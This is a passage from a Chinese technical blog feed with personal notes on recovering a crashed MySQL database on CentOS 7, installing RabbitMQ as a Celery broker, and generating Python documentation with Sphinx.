<p><a href="https://blog.csdn.net/zwx_lucky/article/details/50116051">centos7没有安装ifconfig命令的解决方法</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.cnblogs.com/kreo/p/4368811.html">CentOS7安装iptables防火墙</a></p>
</li>
<li class="lvl-2">
<p><a href="https://blog.csdn.net/chenghuikai/article/details/45173909">Centos7下rc.local文件开机不执行…</a></p>
</li>
</ul>
<hr />
<h1>refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://www.cnblogs.com/wcwen1990/p/7630545.html">CentOS7安装详解</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.osyunwei.com/archives/7829.html">CentOS 7.0系统安装配置图解教程</a></p>
</li>
<li class="lvl-2">
<p><a href="https://blog.csdn.net/xiaodage/article/details/83070380">centos7分区建议生产环境</a></p>
</li>
<li class="lvl-2">
<p><a href="https://blog.csdn.net/justlpf/article/details/80703763">linux xfs和ext4的区别</a></p>
</li>
<li class="lvl-2">
<p><a href="https://blog.csdn.net/sinat_29384657/article/details/51152954">CentOS 7 安装教程、硬盘分区、LVM、网络配置、软件源配置、制作</a></p>
</li>
<li class="lvl-2">
<p><a href="https://v2ex.com/t/146662">在经常突然断电的情况下，使用 ext4 和 xfs 哪个文件系统更安全？</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Dev</category>
      </categories>
      <tags>
        <tag>Dev</tag>
      </tags>
  </entry>
  <entry>
    <title>记录-Mysql无法启动及数据恢复</title>
    <url>/2019/8704.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>Centos7又报io error了.</p>
<p><img src="https://i.loli.net/2019/07/30/5d3fb1f08413459059.png" alt="" /></p>
<p>然后想着把数据库的数据迁移出来.</p>
<p>用Navicat直接操作的时候,发现一直报连接不了数据库的错误.无法正常使用.</p>
<p>然后上头说尝试恢复下硬盘.</p>
<hr />
<h1>修复硬盘:</h1>
<p>按这个链接<a href="https://www.cnblogs.com/itqingtian/p/10469104.html">Centos 7 LVM xfs文件系统修复</a>尝试了一下,未果.</p>
<p>因为上次是进不去系统才进行了<code>xfs_repair</code>,这次一断电才开机就又正常了.</p>
<p>然后以为机器正常了,可是这个时候mysql的服务起不来了.</p>
<blockquote>
<p>这个时候没有看mysql的状态和log.不好的习惯.</p>
</blockquote>
<p>那只好尝试一下通过文件来迁移数据库<code>Mysql</code>.</p>
<hr />
<h1>通过文件迁移数据库:</h1>
<p>按照<a href="https://www.jianshu.com/p/f36c4f4447e9">【MySQL】MySQL数据库迁移并同步（简单粗暴版）</a> 来传mysql的文件.</p>
<p>里面提到通过用<code>rsync</code>来传文件.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#后面的路径是目标路径</span></span><br><span class="line">rsync -avz /var/lib/mysql 192.168.189.131:/var/lib/mysql</span><br><span class="line"></span><br><span class="line">rsync -avz /var/lib/mysql 192.168.189.131:/var/lib/</span><br></pre></td></tr></table></figure>
<p>具体用的哪条命令,忘了…</p>
<hr />
<h1>查看Log</h1>
<p>迁移完数据库文件后,重启数据库服务,依旧起不来.</p>
<p>发现状态一直在<code>activating</code>…</p>
<p>根据<a href="https://www.cnblogs.com/chunzhensuan/p/9178269.html">Centos7 上安装mysql遇上的问题：mysql无法正常启动</a>,去看mysql的log.</p>
<p>才找到了问题所在.</p>
<blockquote>
<p><strong>看Log的重要性!!!</strong></p>
<p><strong>看Log的重要性!!!</strong></p>
<p><strong>看Log的重要性!!!</strong></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">InnoDB: Error: trying to access page number 0 in space 168,</span><br><span class="line">InnoDB: space name okcloud/ok_1_ipscan_task_result,</span><br><span class="line">InnoDB: which is outside the tablespace bounds.</span><br><span class="line">InnoDB: Byte offset 0, len 16384, i/o type 10.</span><br><span class="line">InnoDB: If you get this error at mysqld startup, please check that</span><br><span class="line">InnoDB: your my.cnf matches the ibdata files that you have in the</span><br><span class="line">InnoDB: MySQL server.</span><br><span class="line">2019-07-29 19:23:43 7f2a7946d700  InnoDB: Assertion failure in thread 139820400039680 in file fil0fil.cc line 5666</span><br><span class="line">InnoDB: We intentionally generate a memory trap.</span><br><span class="line">InnoDB: Submit a detailed bug report to http://bugs.mysql.com.</span><br><span class="line">InnoDB: If you get repeated assertion failures or crashes, even</span><br><span class="line">InnoDB: immediately after the mysqld startup, there may be</span><br><span class="line">InnoDB: corruption in the InnoDB tablespace. Please refer to</span><br><span class="line">InnoDB: http://dev.mysql.com/doc/refman/5.6/en/forcing-innodb-recovery.html</span><br><span class="line">InnoDB: about forcing recovery.</span><br></pre></td></tr></table></figure>
<p>访问这个表<code>ok_1_ipscan_task_result</code>出错,可参考<code>forcing recovery</code></p>
<hr />
<h1>恢复数据:</h1>
<h2 id="Mysql-Forcing-InnoDB-Recovery特性">Mysql Forcing InnoDB Recovery特性:</h2>
<blockquote>
<p>需要做特殊操作，让 MySQL 跳过恢复，启动 MySQL，然后把数据导出来，再重建数据库导入。</p>
<p>MySQL 有个一个特性：<a href="https://dev.mysql.com/doc/refman/5.7/en/forcing-innodb-recovery.html">Forcing InnoDB Recovery</a>，启用这个特性需要设置</p>
<p>innodb_force_recovery 大于 0。</p>
<p>innodb_force_recovery 可以设置为 1-6，大的值包含前面所有小于它的值的影响。</p>
<ol>
<li class="lvl-3">
<p><code>(SRV_FORCE_IGNORE_CORRUPT)</code>: <strong>忽略检查到的 corrupt 页。尽管检测到了损坏的 page 仍强制服务运行。一般设置为该值即可，然后 dump 出库表进行重建。</strong></p>
</li>
<li class="lvl-3">
<p><code>(SRV_FORCE_NO_BACKGROUND)</code>: 阻止主线程的运行，如主线程需要执行 full purge 操作，会导致 crash。 阻止 master thread 和任何 purge thread 运行。若 crash 发生在 purge 环节则使用该值。</p>
</li>
<li class="lvl-3">
<p><code>(SRV_FORCE_NO_TRX_UNDO)</code>: 不执行事务回滚操作。</p>
</li>
<li class="lvl-3">
<p><code>(SRV_FORCE_NO_IBUF_MERGE)</code>: 不执行插入缓冲的合并操作。如果可能导致崩溃则不要做这些操作。不要进行统计操作。该值可能永久损坏数据文件。若使用了该值，则将来要删除和重建辅助索引。</p>
</li>
<li class="lvl-3">
<p><code>(SRV_FORCE_NO_UNDO_LOG_SCAN)</code>: 不查看重做日志，InnoDB 存储引擎会将未提交的事务视为已提交。此时 InnoDB 甚至把未完成的事务按照提交处理。该值可能永久性的损坏数据文件。</p>
</li>
<li class="lvl-3">
<p><code>(SRV_FORCE_NO_LOG_REDO)</code>: 不执行前滚的操作。恢复时不做 redo log roll-forward。使数据库页处于废止状态，继而可能引起 B 树或者其他数据库结构更多的损坏。</p>
</li>
</ol>
</blockquote>
<p>一般设为1即可,当时没认真看,直接设为了6…</p>
<p>6可能损坏原有数据库表…</p>
<hr />
<h2 id="做法">做法:</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">my.cnf 中添加：</span><br><span class="line"></span><br><span class="line">[mysqld]</span><br><span class="line">innodb_force_recovery = 1</span><br></pre></td></tr></table></figure>
<p>然后重启数据库,用<code>Navicat</code>将数据库转储成sql语句.</p>
<p>只有在mysql log里报错误的那个表导不出来.不过已经足够了.</p>
<p>恢复了很多的数据.</p>
<hr />
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://blog.csdn.net/shushugood/article/details/80226767">ERROR 1874 (HY000): InnoDB is in read only mode.</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.cnblogs.com/itqingtian/p/10469104.html">Centos 7 LVM xfs文件系统修复</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.jianshu.com/p/f36c4f4447e9">【MySQL】MySQL数据库迁移并同步（简单粗暴版）</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.cnblogs.com/chunzhensuan/p/9178269.html">Centos7 上安装mysql遇上的问题：mysql无法正常启动</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.cnblogs.com/glon/p/6728380.html">利用 Forcing InnoDB Recovery 特性解决 MySQL 重启失败的问题</a></p>
</li>
<li class="lvl-2">
<p><a href="https://blog.csdn.net/shushugood/article/details/80226767">ERROR 1874 (HY000): InnoDB is in read only mode.</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Dev</category>
      </categories>
      <tags>
        <tag>Dev</tag>
      </tags>
  </entry>
  <entry>
    <title>记录-RabbitMq-Install</title>
    <url>/2019/58684.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p><code>celery</code>+<code>redis</code> 经常会出现重复任务.</p>
<p>所以打算用<code>rabbitmq</code>替换<code>redis</code>.</p>
<hr />
<h1>下载与安装:</h1>
<h2 id="erlang">erlang:</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装erlang</span></span><br><span class="line">yum install erlang -y</span><br></pre></td></tr></table></figure>
<h2 id="rabbitmq">rabbitmq:</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装RabbitMQ</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载rpm</span></span><br><span class="line">wget http://www.rabbitmq.com/releases/rabbitmq-server/v3.6.6/rabbitmq-server-3.6.6-1.el7.noarch.rpm</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装</span></span><br><span class="line">yum install rabbitmq-server-3.6.6-1.el7.noarch.rpm -y</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 完成后启动服务：</span></span><br><span class="line">service rabbitmq-server start</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可以查看服务状态：</span></span><br><span class="line">service rabbitmq-server status</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 激活开机启动命令</span></span><br><span class="line">systemctl <span class="built_in">enable</span> rabbitmq-server.service</span><br></pre></td></tr></table></figure>
<hr />
<h1>初始化配置:</h1>
<h2 id="创建配置文件">创建配置文件:</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/rabbitmq/</span><br><span class="line">vi rabbitmq.config</span><br><span class="line"><span class="comment"># 编辑内容如下：</span></span><br><span class="line">[&#123;rabbit, [&#123;loopback_users, []&#125;]&#125;].</span><br></pre></td></tr></table></figure>
<p>这里的意思是开放使用，rabbitmq默认创建的用户<code>guest</code>，密码也是<code>guest</code>，这个用户默认只能是本机访问，localhost或者127.0.0.1，从外部访问需要添加上面的配置。</p>
<h2 id="用户设置">用户设置:</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 添加用户</span></span><br><span class="line">rabbitmqctl add_user celery celery</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 添加虚拟主机</span></span><br><span class="line">rabbitmqctl add_vhost myvhost</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 赋予用户权限</span></span><br><span class="line">rabbitmqctl set_permissions -p myvhost celery <span class="string">&quot;.*&quot;</span> <span class="string">&quot;.*&quot;</span> <span class="string">&quot;.*&quot;</span></span><br></pre></td></tr></table></figure>
<hr />
<h1>修改celery配置文件:</h1>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">CELERY_BROKER_URL = <span class="string">&#x27;amqp://celery:celery@your_ip:5672/myvhost&#x27;</span></span><br><span class="line">CELERY_RESULT_BACKEND = <span class="string">&#x27;amqp://celery:celery@your_ip:5672/myvhost&#x27;</span></span><br></pre></td></tr></table></figure>
<p>修改配置文件后,就可以无缝接入<code>rabbitmq</code>,成功替换掉<code>redis</code>了.</p>
<hr />
<h1>总结:</h1>
<p>只能说这个分布式队列的框架设计得特别好,把功能解耦开了,以至于在替换其中一个组件的时候,是如此的方便,无痛.</p>
<p>好的程序设计思想:<strong>高内聚,低耦合</strong>永不过时.</p>
<p>如果一开始贪快,没有设计好模块间的关系,初期可能感觉关系不大.</p>
<p>但是到了后期要拓展,要debug的时候,才会发现把模块解耦的巨大好处.</p>
<p>所以一开始的模块设计还是要花点心思的.多画画图,没什么坏处.</p>
<hr />
<h1>refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://www.cnblogs.com/uptothesky/p/6094357.html">在CentOS7上安装RabbitMQ</a></p>
</li>
<li class="lvl-2">
<p><a href="https://blog.csdn.net/lanyang123456/article/details/77115868">celery+Rabbit MQ的安装和使用</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Dev</category>
      </categories>
      <tags>
        <tag>Dev</tag>
      </tags>
  </entry>
  <entry>
    <title>记录-Sphinx自动生成Python项目文档</title>
    <url>/2020/17068.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>try一下<code>Sphinx</code>这个自动生成Python项目文档的工具</p>
<hr />
<h1>安装与简介:</h1>
<h2 id="sphinx简介">sphinx简介:</h2>
<p>sphinx是一种基于Python的文档工具，它可以令人轻松的撰写出清晰且优美的文档，由Georg Brandl在BSD许可证下开发。</p>
<p>新版的Python3文档就是由sphinx生成的，并且它已成为Python项目首选的文档工具，同时它对C/C++项目也有很好的支持。</p>
<h2 id="安装-2">安装:</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装Sphinx</span></span><br><span class="line">pip3 install Sphinx -i https://mirrors.aliyun.com/pypi/simple/</span><br></pre></td></tr></table></figure>
<hr />
<h1>建一个测试项目:</h1>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200808114415.png" alt="20200808114415" /></p>
<p>其中<code>1.py</code>代码:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test1</span>():</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    我是测试类，负责测试</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">hello</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        负责打印Hello， 人人可以学Python</span></span><br><span class="line"><span class="string">        :return: </span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;人人可以学Python&quot;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">renren</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        测试Sphinx自动生成文档</span></span><br><span class="line"><span class="string">       </span></span><br><span class="line"><span class="string">        :return: </span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;自动生成文档&quot;</span>)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test2</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">test_2</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        我也不知道写什么好，反正我们这里是用来写文档的</span></span><br><span class="line"><span class="string">        :return: </span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;文档自动生成测试2&quot;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">renren_2</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        所以我们开发的时候就应该在这里写好文档，然后用Sphinx自动生成</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        :return: </span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;自动生成文档2&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><code>2.py</code>代码:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init_test</span>():</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    用于初始化项目测试，不需要任何参数</span></span><br><span class="line"><span class="string">    :return: </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;初始化项目&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    启动项目入口，</span></span><br><span class="line"><span class="string">    :return: </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    test(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">v</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    项目运行主要函数，需要传入一个参数\n</span></span><br><span class="line"><span class="string">    v:&lt;int&gt;</span></span><br><span class="line"><span class="string">    :return: </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(v)</span><br></pre></td></tr></table></figure>
<hr />
<h1>使用Python-Sphinx doc:</h1>
<h2 id="选择配置">选择配置</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建一个doc目录</span></span><br><span class="line"><span class="built_in">mkdir</span> doc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化sphinx项目</span></span><br><span class="line">[root@localhost doc]<span class="comment"># sphinx-quickstart</span></span><br></pre></td></tr></table></figure>
<p>如果找不到命令的话:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost doc]<span class="comment"># sphinx-quickstart</span></span><br><span class="line">-bash: sphinx-quickstart: <span class="built_in">command</span> not found</span><br></pre></td></tr></table></figure>
<p>建立一个软链接或直接使用绝对路径</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1.建立软链接:</span></span><br><span class="line">[root@localhost doc]<span class="comment"># ln -s /usr/local/python3/bin/sphinx-quickstart /usr/bin/sphinx-quickstart</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.使用绝对路径</span></span><br><span class="line">[root@localhost doc]<span class="comment"># /usr/local/python3/bin/sphinx-quickstart</span></span><br></pre></td></tr></table></figure>
<p>除了以下项目外，其他的我都使用了默认值：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost doc]<span class="comment"># /usr/local/python3/bin/sphinx-quickstart</span></span><br><span class="line">Welcome to the Sphinx 3.1.2 quickstart utility.</span><br><span class="line"></span><br><span class="line">Please enter values <span class="keyword">for</span> the following settings (just press Enter to</span><br><span class="line">accept a default value, <span class="keyword">if</span> one is given <span class="keyword">in</span> brackets).</span><br><span class="line"></span><br><span class="line">Selected root path: .</span><br><span class="line"></span><br><span class="line">You have two options <span class="keyword">for</span> placing the build directory <span class="keyword">for</span> Sphinx output.</span><br><span class="line">Either, you use a directory <span class="string">&quot;_build&quot;</span> within the root path, or you separate</span><br><span class="line"><span class="string">&quot;source&quot;</span> and <span class="string">&quot;build&quot;</span> directories within the root path.</span><br><span class="line">&gt; Separate <span class="built_in">source</span> and build directories (y/n) [n]: y</span><br><span class="line"></span><br><span class="line">The project name will occur <span class="keyword">in</span> several places <span class="keyword">in</span> the built documentation.</span><br><span class="line">&gt; Project name: auto_try</span><br><span class="line">&gt; Author name(s): fatboy</span><br><span class="line">&gt; Project release []: 1.0</span><br><span class="line"></span><br><span class="line">If the documents are to be written <span class="keyword">in</span> a language other than English,</span><br><span class="line">you can select a language here by its language code. Sphinx will <span class="keyword">then</span></span><br><span class="line">translate text that it generates into that language.</span><br><span class="line"></span><br><span class="line">For a list of supported codes, see</span><br><span class="line">https://www.sphinx-doc.org/en/master/usage/configuration.html<span class="comment">#confval-language.</span></span><br><span class="line">&gt; Project language [en]: zh_cn</span><br><span class="line"></span><br><span class="line">Creating file /jscan/tools_/auto_doc_try/doc/source/conf.py.</span><br><span class="line">Creating file /jscan/tools_/auto_doc_try/doc/source/index.rst.</span><br><span class="line">Creating file /jscan/tools_/auto_doc_try/doc/Makefile.</span><br><span class="line">Creating file /jscan/tools_/auto_doc_try/doc/make.bat.</span><br><span class="line"></span><br><span class="line">Finished: An initial directory structure has been created.</span><br><span class="line"></span><br><span class="line">You should now populate your master file /jscan/tools_/auto_doc_try/doc/source/index.rst and create other <span class="keyword">do</span></span><br><span class="line"><span class="built_in">source</span> files. Use the Makefile to build the docs, like so:</span><br><span class="line">   make builder</span><br><span class="line"><span class="built_in">where</span> <span class="string">&quot;builder&quot;</span> is one of the supported builders, e.g. html, latex or linkcheck.</span><br></pre></td></tr></table></figure>
<h2 id="配置conf-py"><a href="http://xn--conf-9v6ko99f.py">配置conf.py</a></h2>
<p>在source/conf.py文件中加入如下代码， 导入自己的项目路径</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.path.insert(<span class="number">0</span>, os.path.abspath(<span class="string">&#x27;./../../code&#x27;</span>))</span><br></pre></td></tr></table></figure>
<p>这里要配好,不然待会生成文档的时候会报找不到模块的错</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">WARNING: autodoc: failed to import module <span class="string">&#x27;1&#x27;</span>; the following exception was raised:</span><br><span class="line">No module named <span class="string">&#x27;1&#x27;</span></span><br><span class="line">WARNING: autodoc: failed to import module <span class="string">&#x27;2&#x27;</span>; the following exception was raised:</span><br><span class="line">No module named <span class="string">&#x27;2&#x27;</span></span><br><span class="line">WARNING: autodoc: failed to import module <span class="string">&#x27;doc&#x27;</span>; the following exception was raised:</span><br><span class="line">No module named <span class="string">&#x27;doc&#x27;</span></span><br></pre></td></tr></table></figure>
<hr />
<h2 id="生成rst文件">生成rst文件</h2>
<p>注意:-o 后面跟的是保存rst文件的路径， 你的index.rst在哪个目录，那你就指定哪个目录。然后在后面的是你的项目(代码)路径</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost doc]<span class="comment"># /usr/local/python3/bin/sphinx-apidoc -o ./source/ ../../auto_doc_try/</span></span><br><span class="line">Creating file ./source/1.rst.</span><br><span class="line">Creating file ./source/2.rst.</span><br><span class="line">Creating file ./source/doc.rst.</span><br><span class="line">Creating file ./source/modules.rst.</span><br></pre></td></tr></table></figure>
<hr />
<h2 id="生成html文件">生成html文件</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost doc]<span class="comment"># make html</span></span><br></pre></td></tr></table></figure>
<h3 id="报错1">报错1:</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/jscan/tools_/auto_doc_try/doc/source/1.rst:4: WARNING: Unknown directive type &quot;automodule&quot;.</span><br><span class="line"></span><br><span class="line">.. automodule:: 1</span><br><span class="line">   :members:</span><br><span class="line">   :undoc-members:</span><br><span class="line">   :show-inheritance:</span><br><span class="line">/jscan/tools_/auto_doc_try/doc/source/2.rst:4: WARNING: Unknown directive type &quot;automodule&quot;.</span><br><span class="line"></span><br><span class="line">.. automodule:: 2</span><br><span class="line">   :members:</span><br><span class="line">   :undoc-members:</span><br><span class="line">   :show-inheritance:</span><br><span class="line">/jscan/tools_/auto_doc_try/doc/source/doc.rst:7: WARNING: Unknown directive type &quot;automodule&quot;.</span><br><span class="line"></span><br><span class="line">.. automodule:: doc</span><br><span class="line">   :members:</span><br><span class="line">   :undoc-members:</span><br><span class="line">   :show-inheritance:</span><br></pre></td></tr></table></figure>
<p>在<code>conf.py</code>中加入</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200808115837.png" alt="20200808115837" /></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">extensions = [</span><br><span class="line">        <span class="string">&#x27;sphinx.ext.autodoc&#x27;</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h3 id="执行成功">执行成功:</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost doc]<span class="comment"># make html</span></span><br><span class="line">Running Sphinx v3.1.2</span><br><span class="line">loading translations [zh_cn]... <span class="keyword">done</span></span><br><span class="line">loading pickled environment... <span class="keyword">done</span></span><br><span class="line">building [mo]: targets <span class="keyword">for</span> 0 po files that are out of <span class="built_in">date</span></span><br><span class="line">building [html]: targets <span class="keyword">for</span> 0 <span class="built_in">source</span> files that are out of <span class="built_in">date</span></span><br><span class="line">updating environment: 0 added, 0 changed, 0 removed</span><br><span class="line">looking <span class="keyword">for</span> now-outdated files... none found</span><br><span class="line">no targets are out of <span class="built_in">date</span>.</span><br><span class="line">build succeeded.</span><br><span class="line"></span><br><span class="line">The HTML pages are <span class="keyword">in</span> build/html.</span><br></pre></td></tr></table></figure>
<hr />
<h2 id="用浏览器打开doc-build-html-index-html：">用浏览器打开doc/build/html/index.html：</h2>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200808120143.png" alt="20200808120143" /></p>
<hr />
<h2 id="安装主题">安装主题:</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 命令安装</span></span><br><span class="line">pip3 install sphinx_rtd_theme -i https://mirrors.aliyun.com/pypi/simple/</span><br></pre></td></tr></table></figure>
<p>配置：编辑我们的source/conf.py<br />
导入模块：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sphinx_rtd_theme</span><br></pre></td></tr></table></figure>
<p>将 html_theme = &quot;alabaster&quot;改成如下，在加上html_theme_path</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">html_theme = <span class="string">&quot;sphinx_rtd_theme&quot;</span></span><br><span class="line">html_theme_path = [sphinx_rtd_theme.get_html_theme_path()]</span><br></pre></td></tr></table></figure>
<p>最后我们再执行一次：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make clean</span><br><span class="line">make html</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200808120625.png" alt="20200808120625" /></p>
<hr />
<h1>注释风格Google风格:</h1>
<p>Google风格</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&quot;&quot;</span><br><span class="line">This is a groups style docs.</span><br><span class="line"></span><br><span class="line">Parameters:</span><br><span class="line">  param1 - this is the first param</span><br><span class="line">  param2 - this is a second param</span><br><span class="line"></span><br><span class="line">Returns:</span><br><span class="line">  This is a description of what is returned</span><br><span class="line"></span><br><span class="line">Raises:</span><br><span class="line">  KeyError - raises an exception</span><br><span class="line">&quot;&quot;&quot;</span><br></pre></td></tr></table></figure>
<h2 id="配置">配置:</h2>
<p><code>conf.py</code>中加入</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">extensions = [</span><br><span class="line">    <span class="string">&#x27;sphinx.ext.autodoc&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sphinx.ext.napoleon&#x27;</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<hr />
<h2 id="支持以下关键字">支持以下关键字:</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>Args （参数别名）</p>
</li>
<li class="lvl-2">
<p>Arguments （参数别名）</p>
</li>
<li class="lvl-2">
<p>Attention</p>
</li>
<li class="lvl-2">
<p>Attributes</p>
</li>
<li class="lvl-2">
<p>Caution</p>
</li>
<li class="lvl-2">
<p>Danger</p>
</li>
<li class="lvl-2">
<p>Error</p>
</li>
<li class="lvl-2">
<p>Example</p>
</li>
<li class="lvl-2">
<p>Examples</p>
</li>
<li class="lvl-2">
<p>Hint</p>
</li>
<li class="lvl-2">
<p>Important</p>
</li>
<li class="lvl-2">
<p>Keyword Args （关键字参数的别名）</p>
</li>
<li class="lvl-2">
<p>Keyword Arguments</p>
</li>
<li class="lvl-2">
<p>Methods</p>
</li>
<li class="lvl-2">
<p>Note</p>
</li>
<li class="lvl-2">
<p>Notes</p>
</li>
<li class="lvl-2">
<p>Other Parameters</p>
</li>
<li class="lvl-2">
<p>Parameters</p>
</li>
<li class="lvl-2">
<p>Return （返回别名）</p>
</li>
<li class="lvl-2">
<p>Returns</p>
</li>
<li class="lvl-2">
<p>Raise (alias of Raises)</p>
</li>
<li class="lvl-2">
<p>Raises</p>
</li>
<li class="lvl-2">
<p>References</p>
</li>
<li class="lvl-2">
<p>See Also</p>
</li>
<li class="lvl-2">
<p>Tip</p>
</li>
<li class="lvl-2">
<p>Todo</p>
</li>
<li class="lvl-2">
<p>Warning</p>
</li>
<li class="lvl-2">
<p>Warnings （警告别名）</p>
</li>
<li class="lvl-2">
<p>Warn (alias of Warns)</p>
</li>
<li class="lvl-2">
<p>Warns</p>
</li>
<li class="lvl-2">
<p>Yield （产量别名）</p>
</li>
<li class="lvl-2">
<p>Yields</p>
</li>
</ul>
<h2 id="效果-3">效果:</h2>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200808131325.png" alt="20200808131325" /></p>
<p>嘿嘿,还可以</p>
<hr />
<h2 id="Debug">Debug:</h2>
<h3 id="sphinx会执行代码">sphinx会执行代码:</h3>
<p>refs:</p>
<ul class="lvl-0">
<li class="lvl-2">
